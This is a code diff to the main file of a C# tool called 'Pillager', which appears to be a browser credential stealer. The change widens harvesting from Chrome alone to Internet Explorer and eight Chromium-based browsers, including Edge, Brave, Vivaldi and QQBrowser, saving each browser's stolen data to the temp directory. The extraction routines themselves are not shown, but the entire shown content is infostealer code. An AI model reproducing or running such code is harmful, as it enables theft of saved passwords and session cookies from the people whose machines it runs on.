@@ -1,8 +1,8 @@
 ﻿using System;
+using System.Collections;
 using System.Collections.Generic;
 using System.IO;
-using System.Linq;
-using System.Text;
+using Pillager.Browsers;
 
 namespace Pillager
 {
@@ -11,18 +11,32 @@ namespace Pillager
         static void Main(string[] args)
         {
             string savepath = Path.GetTempPath();
-            string chromepath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
-                "Google\\Chrome\\User Data\\Default");
-            Chrome chrome = new Chrome("Chrome", chromepath);
-            string cookies = chrome.Chrome_cookies();
-            string passwords = chrome.Chrome_passwords();
-            string books = chrome.Chrome_books();
-            string history = chrome.Chrome_history();
-            File.WriteAllText(Path.Combine(savepath, chrome.BrowserName + "_cookies.txt"), cookies);
-            File.WriteAllText(Path.Combine(savepath, chrome.BrowserName + "_passwords.txt"), passwords);
-            File.WriteAllText(Path.Combine(savepath, chrome.BrowserName + "_books.txt"), books);
-            File.WriteAllText(Path.Combine(savepath, chrome.BrowserName + "_history.txt"), history);
-            Console.WriteLine("Files wrote to " + savepath + chrome.BrowserName + "_*.txt");
+
+            //IE
+            IE.Save(savepath);
+            Console.WriteLine("Files wrote to " + savepath + IE.BrowserName + "\\");
+
+            //Chrome
+            List<List<string>> browserOnChromium = new List<List<string>>()
+            {
+                new List<string>() { "Chrome", "Google\\Chrome\\User Data\\Default" } ,
+                new List<string>() { "Chrome Beta", "Google\\Chrome Beta\\User Data\\Default" } ,
+                new List<string>() { "Chromium", "Chromium\\User Data\\Default" } ,
+                new List<string>() { "Edge", "Microsoft\\Edge\\User Data\\Default" } ,
+                new List<string>() { "Brave-Browse", "BraveSoftware\\Brave-Browser\\User Data\\Default" } ,
+                new List<string>() { "QQBrowser", "Tencent\\QQBrowser\\User Data\\Default" } ,
+                new List<string>() { "Vivaldi", "Vivaldi\\User Data\\Default" } ,
+                new List<string>() { "CocCoc", "CocCoc\\Browser\\User Data\\Default" } 
+                //new List<string>() { "", "" } ,
+            };
+            foreach (List<string> browser in browserOnChromium)
+            {
+                string chromepath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
+                browser[1]);
+                Chrome chrome = new Chrome(browser[0], chromepath);
+                chrome.Save(savepath);
+                Console.WriteLine("Files wrote to " + savepath + chrome.BrowserName + "\\");
+            }
         }
     }
 }
